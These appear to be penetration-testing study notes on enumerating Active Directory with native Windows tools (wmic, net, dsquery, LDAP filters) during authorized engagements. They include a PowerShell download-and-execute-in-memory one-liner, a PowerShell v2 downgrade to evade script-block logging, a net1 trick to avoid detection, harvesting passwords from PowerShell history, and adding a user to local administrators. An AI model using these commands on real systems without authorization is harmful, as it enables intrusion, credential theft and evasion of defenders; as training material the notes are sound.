This query shows two hosts, one running Windows 7 and one running Windows Server 2008 (both of which are not "live" in our lab). _Sometimes we will see hosts that are no longer powered on but still appear as records in AD. We should always validate whether they are "live" or not before making recommendations in our reports. We may write up a high-risk finding for Legacy Operating Systems or a best practice recommendation for cleaning up old records in AD_.
We will often see users with local admin rights on their host (perhaps temporarily to install a piece of software, and the rights were never removed), or they occupy a high enough role in the organization to demand these rights (whether they require them or not). Other times we'll see excessive local admin rights handed out across the organization, such as multiple groups in the IT department with local admin over groups of servers or even the entire Domain Users group with local admin over one or more hosts. This can benefit us if we take over a user account with these rights over one or more machines. We can run the query Find Computers where Domain Users are Local Admin to quickly see if there are any hosts where all users have local admin rights. If this is the case, then any account we control can typically be used to access the host(s) in question, and we may be able to retrieve credentials from memory or find other sensitive data.
_Keep in mind as we go through the engagement, we should be documenting every file that is transferred to and from hosts in the domain and where they were placed on disk_. This is good practice if we have to deconflict our actions with the customer. Also, depending on the scope of the engagement, you want to ensure you cover your tracks and clean up anything you put in the environment at the conclusion of the engagement.
We have a great picture of the domain's layout, strengths, and weaknesses. We have credentials for several users and have enumerated a wealth of information such as users, groups, computers, GPOs, ACLs, local admin rights, access rights (RDP, WinRM, etc.), accounts configured with Service Principal Names (SPNs), and more. We have detailed notes and a wealth of output and experimented with many different tools to practice enumerating AD with and without credentials from Linux and Windows attack hosts. What happens if we are restricted with the shell we have or do not have the ability to import tools? Our client may ask us to perform all work from a managed host inside their network without internet access and no way to load our tools. We could land on a host as SYSTEM after a successful attack, but be in a position where it is very difficult or not possible to load tools. What do we do then? In the next section, we will look at how to perform actions while "Living Off The Land."
# Living off the land 
Earlier in the module, we practiced several tools and techniques (both credentialed and uncredentialed) to enumerate the AD environment. These methods required us to upload or pull the tool onto the foothold host or have an attack host inside the environment. This section will discuss several techniques for utilizing native Windows tools to perform our enumeration and then practice them from our Windows attack host.
## Scenario
Let's assume our client has asked us to test their AD environment from a managed host with no internet access, and all efforts to load tools onto it have failed. Our client wants to see what types of enumeration are possible, so we'll have to resort to "living off the land" or only using tools and commands native to Windows/Active Directory. This can also be a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network in previous sections. Most enterprise environments nowadays have some form of network monitoring and logging, including IDS/IPS, firewalls, and passive sensors and tools on top of their host-based defenses such as Windows Defender or enterprise EDR. Depending on the environment, they may also have tools that take a baseline of "normal" network traffic and look for anomalies. Because of this, our chances of getting caught go up exponentially when we start pulling tools into the environment from outside.
## Basic Enumeration Commands
First, we'll cover a few basic environmental commands that can be used to give us more information about the host we are on.
Command |  						Result
-- | --
`hostname` 						| Prints the PC's Name
`[System.Environment]::OSVersion.Version`|  		Prints out the OS version and revision level
`wmic qfe get Caption,Description,HotFixID,InstalledOn` |  	Prints the patches and hotfixes applied to the host
`ipconfig /all 		`| 				Prints out network adapter state and configurations
`set %USERDOMAIN% 	`| 				Displays the domain name to which the host belongs (ran from CMD-prompt)
`set %logonserver% 	`| 				Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
The commands above will give us a quick initial picture of the state the host is in, as well as some basic networking and domain information. _We can cover the information above with one command_ `systeminfo`. The systeminfo command, as seen above, will print a summary of the host's information for us in one tidy output. _Running one command will generate fewer logs, meaning less of a chance we are noticed on the host by a defender_.
## Harnessing PowerShell
PowerShell has been around since 2006 and provides Windows sysadmins with an extensive framework for administering all facets of Windows systems and AD environments. It is a powerful scripting language and can be used to dig deep into systems. PowerShell has many built-in functions and modules we can use on an engagement to recon the host and network and send and receive files.
Let's look at a few of the ways PowerShell can help us.
Cmd-Let 	| Description
-- | --
`Get-Module` |  	Lists available modules loaded for use.
`Get-ExecutionPolicy -List`|  	Will print the execution policy settings for each scope on a host.
`Set-ExecutionPolicy Bypass -Scope Process`| 	This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. _This is ideal because we won't be making a permanent change to the victim host_.
`Get-Content= C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`| 	With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.
`Get-ChildItem Env: \| ft Key,Value`|  	Return environment values such as key paths, users, computer information, etc.
`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"`|  	This is a quick and easy way to download a file from the web using PowerShell and call it from memory.
We have performed basic enumeration of the host. Now, let's discuss a few operational security tactics.
## Downgrade Powershell
Many defenders are unaware that _several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward_. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage. Below is an example of downgrading Powershell.
```powershell
PS C:\htb> Get-host
PS C:\htb> powershell.exe -version 2
PS C:\htb> Get-host
PS C:\htb> get-module
```
We can now see that we are running an older version of PowerShell from the output above. Notice the difference in the version reported. It validates we have successfully downgraded the shell. Let's check and see if we are still writing logs. The primary place to look is in the PowerShell Operational Log found under `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`. All commands executed in our session will log to this file. The Windows PowerShell log located at Applications and Services Logs > Windows PowerShell is also a good place to check. An entry will be made here when we start an instance of PowerShell. In the image below, we can see the red entries made to the log from the current PowerShell session and the output of the last entry made at 2:12 pm when the downgrade is performed. It was the last entry since our session moved into a version of PowerShell no longer capable of logging. Notice that, that event corresponds with the last event in the Windows PowerShell log entries.

With Script Block Logging enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly. _Our actions after will be masked since Script Block Logging does not work below PowerShell 3.0_. Notice above in the logs that we can see the commands we issued during a normal shell session, but it stopped after starting a new PowerShell instance in version 2. _Be aware that the action of issuing the command powershell.exe -version 2 within the PowerShell session will be logged_. So evidence will be left behind showing that the downgrade happened, and a suspicious or vigilant defender may start an investigation after seeing this happen and the logs no longer filling up for that instance. 
## Checking Defenses
The next few commands utilize the `netsh` and `sc` utilities to help us get a feel for the state of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.
### Firewall Checks
```powershell
PS C:\htb> netsh advfirewall show allprofiles
```
### Windows Defender running 
#### From cmd.exe
```cmd
C:\htb> sc query windefend 
```
### Windows Defender status
#### With powershell
```powershell
PS C:\htb> Get-MpComputerStatus
```
Knowing what revision our AV settings are at and what settings are enabled/disabled can greatly benefit us. We can tell how often scans are run, if the on-demand threat alerting is active, and more. This is also great info for reporting. Often defenders may think that certain settings are enabled or scans are scheduled to run at certain intervals. If that's not the case, these findings can help them remediate those issues.
### Am I Alone?
_When landing on a host for the first time, one important thing is to check and see if you are the only one logged in_. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.
```powershell
PS C:\htb> qwinsta
```
## Network Information
Now that we have a solid feel for the state of our host, we can enumerate the network settings for our host and identify any potential domain machines or services we may want to target next.
Networking Commands 		| Description
-- | --
`arp -a 		`| 	Lists all known hosts stored in the arp table.
`ipconfig /all `| 		Prints out adapter settings for the host. We can figure out the network segment from here.
`route print 			`| Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.
`netsh advfirewall show state`| 	Displays the status of the host's firewall. We can determine if it is active and filtering traffic.
Commands such as ipconfig /all and systeminfo show us some basic networking configurations. Two more important commands provide us with a ton of valuable data and could help us further our access. arp -a and route print will show us what hosts the box we are on is aware of and what networks are known to the host. Any networks that appear in the routing table are potential avenues for lateral movement because they are accessed enough that a route was added, or it has administratively been set there so that the host knows how to access resources on the domain. These two commands can be especially helpful in the discovery phase of a black box assessment where we have to limit our scanning
Using `arp -a` and `route print` will not only benefit in enumerating AD environments, but _will also assist us in identifying opportunities to pivot to different network segments in any environment_. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.
## Windows Management Instrumentation (WMI)
Windows Management Instrumentation (WMI) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. For our usage, we will create a WMI report on domain users, groups, processes, and other information from our host and other domain hosts.
### Quick WMI checks
Command |  										Description
-- | --
`wmic qfe get Caption,Description,HotFixID,InstalledOn`| 				Prints the patch level and description of the Hotfixes applied
`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`| 	Displays basic host information to include any attributes within the list
`wmic process list /format:list 						`| 	A listing of all processes on host
`wmic ntdomain list /format:list 						`| 	Displays information about the Domain and Domain Controllers
`wmic useraccount list /format:list 						`| 	Displays information about all local accounts and any domain accounts that have logged into the device
`wmic group list /format:list 						`| 		Information about all local groups
`wmic sysaccount list /format:list 						`| 	Dumps information about any system accounts that are being used as service accounts.
Below we can see information about the domain and the child domain, and the external forest that our current domain has a trust with. This [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) has some useful commands for querying host and domain info using wmic.
```powershell
PS C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

Caption          Description      DnsForestName           DomainControllerAddress  DomainName
ACADEMY-EA-MS01  ACADEMY-EA-MS01
INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\172.16.5.5             INLANEFREIGHT
LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\172.16.5.240           LOGISTICS
FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\172.16.5.238           FREIGHTLOGISTIC
```
## Net Commands
Net commands can be beneficial to us when attempting to enumerate information from the domain. These commands can be used to query the local host and remote hosts, much like the capabilities provided by WMI. We can list information such as:
```txt
Local and domain users
Groups
Hosts
Specific users in groups
Domain Controllers
Password requirements
```
We'll cover a few examples below. Keep in mind that `net.exe` commands are typically monitored by EDR solutions and can quickly give up our location if our assessment has an evasive component. Some organizations will even configure their monitoring tools to throw alerts if certain commands are run by users in specific OUs, such as a Marketing Associate's account running commands such as whoami, and net localgroup administrators, etc. This could be an obvious red flag to anyone monitoring the network heavily.
### Table of Useful Net Commands
Command |  					Description
-- | --
`net accounts`|  					Information about password requirements
`net accounts /domain`|  				Password and lockout policy
`net group /domain`| 				Information about domain groups
`net group "Domain Admins" /domain`| 		List users with domain admin privileges
`net group "domain computers" /domain`| 		List of PCs connected to the domain
`net group "Domain Controllers" /domain`| 		List PC accounts of domains controllers
`net group <domain_group_name> /domain`| 		User that belongs to the group
`net groups /domain`| 				List of domain groups
`net localgroup`| 					All available groups
`net localgroup administrators /domain`| 		List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
`net localgroup Administrators`| 			Information about a group (admins)
`net localgroup administrators [username] /add`| 	Add user to administrators
`net share`| 					Check current shares
`net user <ACCOUNT_NAME> /domain`| 		Get information about a user within the domain
`net user /domain`| 				List all users of the domain
`net user %username%` 				| Information about the current user
`net use x: \computer\share` | 			Mount the share locally
`net view`| 					Get a list of computers
`net view /all /domain[:domainname]`| 		Shares on the domains
`net view \computer /ALL`|  			List shares of a computer
`net view /domain`| 				List of PCs of the domain
Net Commands Trick
If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. _Typing net1 instead of net will execute the same functions without the potential trigger from the net string_.
## Dsquery
Dsquery is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section. But, it is a likely tool that domain sysadmins are utilizing in their environment. With that in mind, dsquery will exist on any host with the Active Directory Domain Services Role installed, and the dsquery DLL exists on all modern Windows systems by default now and can be found at `C:\Windows\System32\dsquery.dll`.
Dsquery DLL
All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a SYSTEM context. Below, we will show the basic search function with dsquery and a few helpful search filters.
Command | 				Description
-- | --
`Dsquery *`|			Finds objects in the active directory according to search criteria using an LDAP query.
`Dsquery user`|			Finds the user objects in the active directory according to specified search criteria.
`Dsquery computer`|		Finds the computers in the active directory according to specified search criteria.
`Dsquery group`|			Finds the groups in the active directory according to specified search criteria.
`Dsquery ou`|			Finds the organizational units (OUs) in the active directory according to specified search criteria.
`Dsquery contact`|			Finds the contacts in the active directory that matches the specified search criteria.
`Dsquery site`|			Finds the sites in the active directory that matches the specified search criteria.
`Dsquery server`|			Finds the domain controllers in the active directory according to specified search criteria.
`Dsquery quota`|			Finds the quota specifications in the active directory that matches the specified search criteria. A quota specification determines the maximum number of directory objects a specified security principal owns in a given directory partition.
`Dsquery partition`|		Finds the partition objects in the active directory that matches the specified search criteria.
El comando dsget funciona mediante el DN de los objetos. _Se puede combinar dsquery con dsget_ 
```powershell
dsquery user -name P* | dsget user -samid -display
```
### Wildcard Search
We can use a dsquery wildcard search to view all objects in an OU, for example.
```powershell
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```
### Users With Specific Attributes 
We can, of course, combine dsquery with LDAP search filters of our choosing. The below looks for users with the PASSWD_NOTREQD flag set in the userAccountControl attribute.
```powershell
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```
Another example querying for detailed information about a user 
```powershell
dsquery * -filter "(objectclass=user)" -attr * -limit 1
```
### Searching for Domain Controllers
The below search filter looks for all Domain Controllers in the current domain, limiting to five results.
```powershell
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```
### Compound filter
A compound filter will look like these:
* Here the `&` indicates that it is a compound filter, and any results must have both values for the corresponding attribute. With the `!` symbol you can exclude items in your filters, but be sure to wrap it in a set of parenthesis. You can also exclude some results like this:
```powershell
“(&(attribute1=value1)(attribute2=value2))”
```
* This filter will produce a list of results where the objects have value1 for attribute1 but do not have value2 for attribute2. These filters will work the same between dsquery and ldapsearch. Depending on what command line utility you are using, you may have difficulty with the ! symbol.
```powershell
“(&(attribute1=value1)(!(attribute2=value2)))”
```
### Using filters 
```powershell
PS C:\Tools> dsquery * -filter "(&(objectclass=computer)(name=*win*))" -attr name description -d 172.16.5.5
PS C:\Tools> dsquery * -filter "(objectclass=user)" -attr name description -d 172.16.5.5
```
### PasswordLast Set 
Password Last Set: The pwdLastSet attribute may help you when you are looking for accounts to target. Service accounts sometimes have older and more simple passwords because they are needed for specific functions and changing them can be difficult depending on what they are used for. This can also be a quick check during an assessment to see if the organization’s password policy is properly implemented.
```powershell
PS C:\Windows\system32> dsquery * -filter "(objectclass=user)" -attr name pwdlastset -d 172.16.5.5
PS C:\Windows\system32> w32tm.exe /ntte 132798298291720078
```
Filtering for less time than pwdlastset administrator
```powershell
PS C:\Windows\system32> dsquery * -filter "(&(objectclass=user)(pwdlastset<=132798197726313370))" -attr name pwdlastest -d 172.16.5.5
dsquery * -filter “(&(memberof=CN=Staff,DC=PLANETEXPRESS,DC=LOCAl)(memberof=CN=ShipCrew,DC=PLANETEXPRESS,DC=LOCAL))” -attr name memberof -d 192.168.88.195
```
Option | Description
-- | --
`-attr *` | All attributes
`-d` | Domain by FQDN or IP 
`-u -p` | Username and password to use for querying AD
## LDAP Filtering Explained
You will notice in the queries above that we are using strings such as userAccountControl:1.2.840.113556.1.4.803:=8192. These strings are common LDAP queries that can be used with several different tools too, including AD PowerShell, ldapsearch, and many others. Let's break them down quickly:
Option | Description
-- | --
`userAccountControl:1.2.840.113556.1.4.803`| Specifies that we are looking at the User Account Control (UAC) attributes for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as Object Identifiers ([OIDs](https://ldap.com/ldap-oid-reference-guide/))
`=8192`|  Represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like password is not required or account is locked is set. These values can compound and make multiple different bit entries. Here is a quick list of potential values. [UAC Values](https://academy.hackthebox.com/storage/modules/143/UAC-values.png)
### OID match strings
OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:
1. When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.
```powershell
1.2.840.113556.1.4.803
```
2. When using this rule, we are saying that we want our results tlo show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.
```powershell
1.2.840.113556.1.4.804
```
3. This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.
```powershell
1.2.840.113556.1.4.1941
```
When building out search strings, we can utilize logical operators to combine values for the search. The operators & | and ! are used for this purpose. For example we can combine multiple search criteria with the & (and) operator like so:
```powershell
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
```
The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like (&(1) (2) (3)). The ! (not) and | (or) operators can work similarly. For example, our filter above can be modified as follows:
```powershell
(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))
```
This would search for any user object that does NOT have the Password Can't Change attribute set. When thinking about users, groups, and other objects in AD, our ability to search with LDAP queries is pretty extensive.
